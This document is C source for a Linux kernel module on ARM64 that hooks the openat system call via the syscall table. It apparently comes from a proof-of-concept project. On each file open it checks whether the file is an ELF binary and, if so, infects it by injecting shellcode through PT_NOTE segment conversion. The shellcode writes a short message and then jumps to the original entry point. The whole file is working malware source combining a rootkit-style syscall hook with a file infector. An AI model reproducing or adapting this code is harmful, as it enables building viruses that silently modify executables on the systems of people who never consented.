#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include "resolve_kallsyms.h"
#include "copy_sys_call_table.h"
#include "hook.h"
#include "pt_note_infection.h"

#define WRITE_CODE_INS_COUNT 5

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xwillow");
MODULE_VERSION("1.0");

static asmlinkage int (*orig_openat) (const struct pt_regs *);

asmlinkage int new_openat(const struct pt_regs *regs) {
    __label__ out, err;
    char __user *pathname_usr_ptr = (char *) regs->regs[1];
    char pathname[NAME_MAX] = {0};
    strncpy_from_user(pathname, pathname_usr_ptr, NAME_MAX);
    // pr_info("debug: hooked openat :D, pathname (%s), flags (%i)\n", pathname, (int) regs->regs[2]);
    struct file *f = kernel_open(pathname, O_RDWR);
    if (!f) {
        goto err;
    }

    if (!is_elf(f)) {
        // pr_info("debug: (%s) is not ELF, exiting\n", pathname);
        goto out;
    }
    // if (!is_elf_exec(f)) {
    //     pr_info("debug: (%s) is not exec ELF, exiting\n", pathname);
    //     goto out;
    // }
    pr_info("debug: (%s) is exec ELF, cont\n", pathname);

    unsigned char write_code[] = {0x82, 0x00, 0x80, 0xd2, 0x20, 0x00, 0x80, 0xd2,
                                  0x81, 0x00, 0x00, 0x58, 0x03, 0x00, 0x00, 0x14,
                                  0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x00, 0x00, 0x00,
                                  0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

    uintptr_t orig_entry = get_elf_entry(f);
    pr_info("debug: (%s), orig_entry @ %p\n", pathname, orig_entry);
    uint32_t *jump_entry_code = generate_shellcode(orig_entry);

    void *shellcode = vmalloc((WRITE_CODE_INS_COUNT + SHELLCODE_INS_COUNT) * INS_SIZE);
    memcpy(shellcode, write_code, WRITE_CODE_INS_COUNT * INS_SIZE);
    memcpy(shellcode + WRITE_CODE_INS_COUNT * INS_SIZE, jump_entry_code, SHELLCODE_INS_COUNT * INS_SIZE);

    pt_note_infect(f, shellcode, (WRITE_CODE_INS_COUNT + SHELLCODE_INS_COUNT) * INS_SIZE);

    out: filp_close(f, NULL);
    err: return orig_openat(regs);
}


static int __init hook_test_mod_init(void) {
    struct ehh_hook hook = {__NR_openat, new_openat, &orig_openat};
    void **table = kallsyms_lookup_name_("sys_call_table");
    pr_info("debug: pre-hook sys_call_table[__NR_openat] (%pK)\n", table[__NR_openat]);
    hook_el0_svc_common(&hook);
    pr_info("debug: post-hook sys_call_table[__NR_openat] (%pK)\n", table[__NR_openat]);

    pr_info("debug: module loaded\n");
    return 0;
}

static void __exit hook_test_mod_exit(void) {
    pr_info("debug: module unloaded\n");
}


module_init(hook_test_mod_init);
module_exit(hook_test_mod_exit);
